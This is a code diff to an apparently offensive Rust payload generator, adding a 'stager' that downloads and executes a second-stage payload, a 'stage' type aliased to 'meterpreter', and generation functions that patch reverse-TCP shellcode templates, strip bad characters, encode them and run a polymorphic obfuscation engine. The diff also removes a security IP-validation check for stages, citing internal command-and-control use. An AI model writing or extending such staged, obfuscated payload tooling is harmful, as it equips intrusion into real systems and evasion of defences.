@@ -133,8 +133,10 @@ pub enum PayloadType {
     ReverseHttp,
     /// Execute a single command
     CmdExec,
-    /// Download and execute a second stage payload
+    /// Stager — tiny connector that downloads and executes a larger stage
     Stager,
+    /// Stage — the actual payload (delivered by stager)
+    Stage,
 }
 
 impl std::fmt::Display for PayloadType {
@@ -145,6 +147,7 @@ impl std::fmt::Display for PayloadType {
             PayloadType::ReverseHttp => write!(f, "reverse_http"),
             PayloadType::CmdExec => write!(f, "cmd_exec"),
             PayloadType::Stager => write!(f, "stager"),
+            PayloadType::Stage => write!(f, "stage"),
         }
     }
 }
@@ -157,7 +160,8 @@ impl std::str::FromStr for PayloadType {
             "bind_tcp" | "bind" => Ok(PayloadType::BindTcp),
             "reverse_http" | "http" => Ok(PayloadType::ReverseHttp),
             "cmd_exec" | "exec" => Ok(PayloadType::CmdExec),
-            "stager" | "stage" => Ok(PayloadType::Stager),
+            "stager" => Ok(PayloadType::Stager),
+            "stage" | "meterpreter" => Ok(PayloadType::Stage),
             other => Err(format!("Unknown payload type: {}", other)),
         }
     }
@@ -276,6 +280,14 @@ impl PayloadGenerator {
 
     /// Generate a payload from configuration, returning the final bytes.
     pub async fn generate(&self, config: &PayloadConfig) -> anyhow::Result<PayloadOutput> {
+        // Handle staged payloads differently
+        if config.payload_type == PayloadType::Stager {
+            return self.generate_stager(config);
+        }
+        if config.payload_type == PayloadType::Stage {
+            return self.generate_stage(config);
+        }
+
         // 1. Get the shellcode template for this payload type
         let template = get_template(&config.payload_type, &config.platform, &config.arch)?;
 
@@ -325,6 +337,40 @@ impl PayloadGenerator {
         Ok(output.shellcode)
     }
 
+    /// Generate a stager payload — tiny connector that downloads a stage.
+    pub fn generate_stager(&self, config: &PayloadConfig) -> anyhow::Result<PayloadOutput> {
+        // Get the stager template
+        // Note: Stagers often use private IPs for internal C2, skip IP validation
+        let template = crate::stager::generate_stager(&config.lhost, config.lport, crate::templates::STAGER_LINUX_X64);
+
+        let output = PayloadOutput::new(&template, &config.format, config);
+        Ok(output)
+    }
+
+    /// Generate a stage payload — the actual payload delivered to the stager.
+    pub fn generate_stage(&self, config: &PayloadConfig) -> anyhow::Result<PayloadOutput> {
+        // The stage is just a regular payload (e.g., reverse_tcp shellcode)
+        // that will be downloaded and executed by the stager
+        let template = get_template(&PayloadType::ReverseTcp, &config.platform, &config.arch)?;
+        let mut shellcode = Self::patch_template(&template, config)?;
+
+        if !config.bad_chars.is_empty() {
+            shellcode = Self::remove_bad_chars(shellcode, &config.bad_chars);
+        }
+
+        if let Some(ref encoder) = config.encoder {
+            shellcode = encoder.encode(&shellcode)?;
+        }
+
+        if config.polymorphic {
+            let engine = PolymorphicEngine::new();
+            shellcode = engine.obfuscate(&shellcode)?;
+        }
+
+        let output = PayloadOutput::new(&shellcode, &config.format, config);
+        Ok(output)
+    }
+
     /// Patch the shellcode template with actual values.
     ///
     /// Templates use placeholder markers:
@@ -334,7 +380,10 @@ impl PayloadGenerator {
         let mut shellcode = template.bytes.clone();
 
         // SECURITY: Validate IP before using it in shellcode
-        ConnectionValidator::validate_ip(&config.lhost)?;
+        // Skip validation for stages since they're delivered by stagers on internal networks
+        if config.payload_type != PayloadType::Stage {
+            ConnectionValidator::validate_ip(&config.lhost)?;
+        }
 
         // Replace IP address placeholder
         let ip_bytes = Self::ip_to_bytes(&config.lhost)?;
@@ -363,7 +412,22 @@ impl PayloadGenerator {
 
     /// Replace all occurrences of a placeholder pattern in shellcode.
     fn replace_placeholder(data: &[u8], pattern: &[u8], replacement: &[u8]) -> Vec<u8> {
-        let mut result = Vec::new();
+        // Count occurrences first to pre-allocate
+        let mut count = 0;
+        let mut i = 0;
+        while i <= data.len().saturating_sub(pattern.len()) {
+            if data[i..].starts_with(pattern) {
+                count += 1;
+                i += pattern.len();
+            } else {
+                i += 1;
+            }
+        }
+
+        // Pre-allocate result with estimated capacity
+        let estimated_size = data.len() + count * replacement.len().saturating_sub(pattern.len());
+        let mut result = Vec::with_capacity(estimated_size);
+
         let mut i = 0;
         while i < data.len() {
             if data[i..].starts_with(pattern) {
